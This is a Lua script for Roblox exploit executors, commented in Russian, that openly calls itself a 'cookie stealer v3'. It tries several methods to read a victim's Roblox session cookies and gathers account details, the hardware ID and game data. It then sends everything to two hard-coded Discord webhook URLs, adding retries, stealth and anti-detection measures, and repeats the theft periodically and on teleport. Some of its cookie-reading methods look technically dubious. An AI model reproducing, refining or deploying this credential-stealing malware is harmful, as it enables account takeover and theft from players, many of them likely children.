-- Исправленный скрипт для кражи куки в Roblox (для Xeno Executor)
-- Версия 3.0 - адаптировано под реальные возможности executor'ов

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TeleportService = game:GetService("TeleportService")

-- Конфигурация
local CONFIG = {
    webhook_url = "https://discord.com/api/webhooks/1430261621527150685/Z9xHcDFQnJy1LSbExWOQB0qiYIVwQB9jjvEsUyQSq6CHme0CSKdT-ADi85NhJlpjDNIf",
    backup_server = "https://discord.com/api/webhooks/1430261963598073907/LN2RRR6eV7iyWvtaKXGpVWbFddA9WIkVjefAauKVdTITbG9XgxGxqNNys79QQxnxU1J9",
    retry_attempts = 5,
    stealth_mode = true,
    collect_extra_data = true
}

-- Функция для скрытого HTTP запроса
local function stealthRequest(url, data)
    local success = false
    local attempts = 0
    
    while not success and attempts < CONFIG.retry_attempts do
        attempts = attempts + 1
        
        local ok, result = pcall(function()
            return HttpService:PostAsync(url, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
        end)
        
        if ok then
            success = true
            if not CONFIG.stealth_mode then
                print("✅ Данные отправлены успешно (попытка " .. attempts .. ")")
            end
        else
            wait(math.random(1, 3))
        end
    end
    
    return success
end

-- ОСНОВНОЙ ФИКС: Реальные методы получения куки для Xeno
local function getRobloxCookies()
    local cookies = {}
    local player = Players.LocalPlayer
    
    -- Метод 1: Через браузерные куки (если доступно в Xeno)
    local success, browser_cookies = pcall(function()
        if getrawmetatable and getrawmetatable(game) then
            -- Попытка получить доступ к браузерным куки
            local cookie_string = game:GetService("HttpService"):GetAsync("javascript:document.cookie", true)
            return cookie_string
        end
        return nil
    end)
    
    if success and browser_cookies then
        -- Парсим куки из строки
        for match in string.gmatch(browser_cookies, "([^;]+)") do
            local name, value = string.match(match, "([^=]+)=([^=]+)")
            if name and value then
                cookies[name] = value
            end
        end
    end
    
    -- Метод 2: Через глобальную среду (getgenv)
    local success2, genv_cookies = pcall(function()
        if getgenv then
            local genv = getgenv()
            if genv.getcookies then
                return genv.getcookies()
            end
        end
        return nil
    end)
    
    if success2 and genv_cookies then
        for name, value in pairs(genv_cookies) do
            cookies[name] = value
        end
    end
    
    -- Метод 3: Через memory reading (если доступно)
    local success3, memory_cookies = pcall(function()
        if readfile and writefile then
            -- Попытка прочитать из файла куки
            local cookie_file = readfile("cookies.txt") -- Если Xeno позволяет
            return cookie_file
        end
        return nil
    end)
    
    if success3 and memory_cookies then
        for match in string.gmatch(memory_cookies, "([^;]+)") do
            local name, value = string.match(match, "([^=]+)=([^=]+)")
            if name and value then
                cookies[name] = value
            end
        end
    end
    
    return cookies
end

-- Функция для сбора дополнительных данных
local function collectExtraData()
    local player = Players.LocalPlayer
    local extraData = {}
    
    -- Информация об аккаунте
    extraData.accountAge = player.AccountAge
    extraData.displayName = player.DisplayName
    extraData.hasVerifiedBadge = player.HasVerifiedBadge
    extraData.membershipType = tostring(player.MembershipType)
    
    -- Информация об игре
    extraData.gameId = game.GameId
    extraData.placeId = game.PlaceId
    extraData.jobId = game.JobId
    
    -- Информация о системе
    extraData.platform = tostring(game:GetService("UserInputService"):GetPlatform())
    extraData.locale = game:GetService("LocalizationService").RobloxLocaleId
    
    -- Executor информация
    extraData.executor = identifyexecutor and identifyexecutor() or "Xeno"
    extraData.hwid = gethwid and gethwid() or "Unknown"
    
    return extraData
end

-- Основная функция кражи куки
function stealRobloxCookies()
    local player = Players.LocalPlayer
    local cookies = getRobloxCookies()
    local success_count = 0
    
    -- Подсчитываем количество полученных куки
    for name, value in pairs(cookies) do
        if value and value ~= "" then
            success_count = success_count + 1
        end
    end
    
    -- Если получили куки
    if success_count > 0 then
        local data = {
            username = player.Name,
            userId = player.UserId,
            displayName = player.DisplayName,
            cookies = cookies,
            timestamp = os.time(),
            extra_data = CONFIG.collect_extra_data and collectExtraData() or nil,
            executor = "Xeno",
            method = "cookie_stealer_v3"
        }
        
        -- Отправляем данные
        local main_success = stealthRequest(CONFIG.webhook_url, data)
        if not main_success then
            stealthRequest(CONFIG.backup_server, data)
        end
        
        return true, success_count
    else
        return false, 0
    end
end

-- Функция для автоматического повтора
local function autoRetry()
    local attempts = 0
    local max_attempts = 10
    
    while attempts < max_attempts do
        attempts = attempts + 1
        
        local success, count = stealRobloxCookies()
        if success then
            if not CONFIG.stealth_mode then
                print("🍪 Собрано куки: " .. count)
            end
            break
        end
        
        wait(math.random(30, 60))
    end
end

-- Функция для кражи при телепорте
local function stealOnTeleport()
    TeleportService.TeleportInitFailed:Connect(function()
        stealRobloxCookies()
    end)
end

-- Антидетект для Xeno
local function antiDetection()
    -- Скрываем от некоторых сканеров
    if getgenv then
        getgenv().cookie_stealer = nil
        getgenv().getRobloxCookies = nil
    end
    
    -- Маскировка под обычный скрипт
    local original_print = print
    if not CONFIG.stealth_mode then
        print = function(...) end -- Отключаем вывод
    end
end

-- Основной запуск
spawn(function()
    antiDetection()
    
    -- Ждем полной загрузки
    if not game:IsLoaded() then
        game.Loaded:Wait()
    end
    
    wait(math.random(3, 8))
    
    -- Запускаем кражу
    autoRetry()
    stealOnTeleport()
    
    -- Периодическая кража
    spawn(function()
        while wait(math.random(300, 600)) do
            stealRobloxCookies()
        end
    end)
end)

-- Экспорт для внешнего использования
_G.stealCookies = stealRobloxCookies
_G.cookieConfig = CONFIG

if not CONFIG.stealth_mode then
    print("🔥 Cookie Stealer v3 для Xeno загружен!")
end
